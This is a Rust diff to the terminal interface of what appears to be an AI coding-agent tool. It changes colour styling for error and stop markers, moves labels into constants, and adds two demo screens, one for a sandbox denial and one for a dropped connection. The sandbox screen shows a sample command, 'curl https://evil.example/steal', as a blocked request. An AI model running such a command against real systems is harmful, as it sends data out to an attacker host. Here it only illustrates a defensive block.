@@ -95,6 +95,8 @@ pub fn is_lock_board(id: &str) -> bool {
             | "edit"
             | "splash"
             | "palette"
+            | "sandbox_deny"
+            | "mcp_drop"
     )
 }
 
@@ -150,6 +152,8 @@ pub fn render_lock_board(id: &str, area: Rect, buf: &mut Buffer) {
         "edit" => board_edit(area, buf),
         "splash" => board_splash(area, buf),
         "palette" => board_palette(area, buf),
+        "sandbox_deny" => board_sandbox_deny(area, buf),
+        "mcp_drop" => board_mcp_drop(area, buf),
         _ => {}
     }
 }
@@ -208,7 +212,7 @@ fn paint_composer(area: Rect, buf: &mut Buffer, y: u16, composer: Composer<'_>) 
     let mut row = y + 1;
     match composer {
         Composer::Ghost(ghost) => {
-            buf.set_string(area.x, row, "> ", Style::default().fg(TEXT));
+            buf.set_string(area.x, row, "> ", Style::default().fg(ACCENT));
             let shown = first_fitting_line(ghost, w.saturating_sub(4));
             let mut x = area.x + 2;
             if !shown.is_empty() {
@@ -227,17 +231,20 @@ fn paint_composer(area: Rect, buf: &mut Buffer, y: u16, composer: Composer<'_>) 
             let last = parts.len().saturating_sub(1);
             for (i, part) in parts.iter().enumerate() {
                 let prefix = if i == 0 { "> " } else { "  " };
+                let caret = if i == 0 { ACCENT } else { TEXT };
+                buf.set_string(area.x, row, prefix, Style::default().fg(caret));
                 let cursor = if i == last { "█" } else { "" };
                 buf.set_string(
-                    area.x,
+                    area.x + prefix.chars().count() as u16,
                     row,
-                    format!("{prefix}{part}{cursor}"),
+                    format!("{part}{cursor}"),
                     Style::default().fg(TEXT),
                 );
                 row += 1;
             }
             if parts.is_empty() {
-                buf.set_string(area.x, row, "> █", Style::default().fg(TEXT));
+                buf.set_string(area.x, row, "> ", Style::default().fg(ACCENT));
+                buf.set_string(area.x + 2, row, "█", Style::default().fg(TEXT));
                 row += 1;
             }
         }
@@ -1720,7 +1727,7 @@ fn board_mcp(area: Rect, buf: &mut Buffer) {
         ),
         (
             "x",
-            TEXT,
+            ERROR,
             "linear",
             "failed",
             "connection refused — retrying in 30s",
@@ -1840,10 +1847,13 @@ fn board_quota(area: Rect, buf: &mut Buffer) {
         lines.push(Line::from(""));
     }
     lines.push(Line::from(vec![
-        Span::styled("x ", Style::default().fg(TEXT).add_modifier(Modifier::BOLD)),
         Span::styled(
-            "Agent quota exhausted",
-            Style::default().fg(TEXT).add_modifier(Modifier::BOLD),
+            "x ",
+            Style::default().fg(ERROR).add_modifier(Modifier::BOLD),
+        ),
+        Span::styled(
+            crate::ui::consts::QUOTA_EXHAUSTED,
+            Style::default().fg(ERROR).add_modifier(Modifier::BOLD),
         ),
     ]));
     lines.push(white(first_fitting_line("Agent requests", w)));
@@ -1871,9 +1881,9 @@ fn board_quota(area: Rect, buf: &mut Buffer) {
     }
     // The composer ghost keeps its full meaning at 40 columns.
     let ghost = if compact(area) {
-        "Follow-up — held until quota resets"
+        crate::ui::consts::PLACEHOLDER_QUOTA_NARROW
     } else {
-        "Add a follow-up — held until quota resets"
+        crate::ui::consts::PLACEHOLDER_QUOTA
     };
     paint_session(
         area,
@@ -3273,7 +3283,7 @@ fn board_btw(area: Rect, buf: &mut Buffer) {
 }
 
 /// State 37 — the run was interrupted: prompt and tool tiles stay on screen,
-/// then `✗ Stopped`. Shared by the `interrupt` and `stopped` captures.
+/// then `× Stopped` in error red. Shared by the `interrupt` and `stopped` captures.
 fn board_stopped(area: Rect, buf: &mut Buffer) {
     let w = inner_width(area);
     let mut lines = user_prompt_lines(area);
@@ -3302,12 +3312,14 @@ fn board_stopped(area: Rect, buf: &mut Buffer) {
     if !compact(area) {
         lines.push(Line::from(""));
     }
-    // An interrupt is not an error: `✗ Stopped` stays white, the meta dim.
     lines.push(Line::from(vec![
-        Span::styled("✗ ", Style::default().fg(TEXT)),
         Span::styled(
-            "Stopped",
-            Style::default().fg(TEXT).add_modifier(Modifier::BOLD),
+            format!("{} ", crate::ui::consts::STOPPED_MARK),
+            Style::default().fg(ERROR),
+        ),
+        Span::styled(
+            crate::ui::consts::STOPPED_TITLE,
+            Style::default().fg(ERROR).add_modifier(Modifier::BOLD),
         ),
     ]));
     lines.push(dim(first_fitting_line("12s · 4.1k tokens · ctrl+c", w)));
@@ -3894,4 +3906,56 @@ fn board_settings_hub(area: Rect, buf: &mut Buffer) {
         "↑↓ select · ↵ open · esc close",
         &format!("{MODEL} · Agent"),
     );
+}
+
+fn board_sandbox_deny(area: Rect, buf: &mut Buffer) {
+    let w = inner_width(area);
+    let mut lines = user_turn_lines("curl https://evil.example/steal", area);
+    if !compact(area) {
+        lines.push(Line::from(""));
+    }
+    lines.push(Line::from(vec![
+        Span::styled(
+            format!("{} ", crate::ui::consts::STOPPED_MARK),
+            Style::default().fg(ERROR),
+        ),
+        Span::styled(
+            crate::ui::consts::SANDBOX_DENIED_TITLE,
+            Style::default().fg(ERROR).add_modifier(Modifier::BOLD),
+        ),
+    ]));
+    for part in wrap_or_drop(
+        "curl was blocked by the workspace sandbox. Network is allowlisted.",
+        w,
+    ) {
+        lines.push(dim(part));
+    }
+    paint_session(
+        area,
+        buf,
+        lines,
+        &format!("{MODEL} · Agent · Smart"),
+        GHOST_IDLE,
+    );
+}
+
+fn board_mcp_drop(area: Rect, buf: &mut Buffer) {
+    let w = inner_width(area);
+    let mut lines = user_turn_lines("/mcp", area);
+    if !compact(area) {
+        lines.push(Line::from(""));
+    }
+    lines.push(Line::from(vec![
+        Span::styled("x ", Style::default().fg(ERROR)),
+        Span::styled("github  ", Style::default().fg(TEXT)),
+        Span::styled("dropped", Style::default().fg(TEXT_DIM)),
+    ]));
+    for part in wrap_or_drop("connection lost — retrying in 30s", w) {
+        lines.push(dim(part));
+    }
+    if !compact(area) {
+        lines.push(Line::from(""));
+        lines.push(dim(first_fitting_line("r reconnect · esc close", w)));
+    }
+    paint_session(area, buf, lines, &format!("{MODEL} · Agent"), GHOST_IDLE);
 }
